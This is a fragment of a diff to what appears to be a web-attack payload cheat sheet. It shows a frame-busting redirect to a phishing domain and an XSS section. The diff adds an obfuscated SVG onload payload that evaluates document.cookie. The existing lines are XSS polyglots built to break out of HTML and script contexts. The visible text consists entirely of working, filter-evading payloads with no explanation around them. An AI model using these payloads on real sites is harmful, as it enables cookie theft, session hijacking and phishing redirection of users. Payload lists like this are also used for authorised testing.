@@ -437,6 +437,7 @@ if (window.parent != window) window.parent.location.replace('http://phishing.com
 
 ### XSS
 ```
+ <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 javascript://comment%0a%0dalert(0);
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
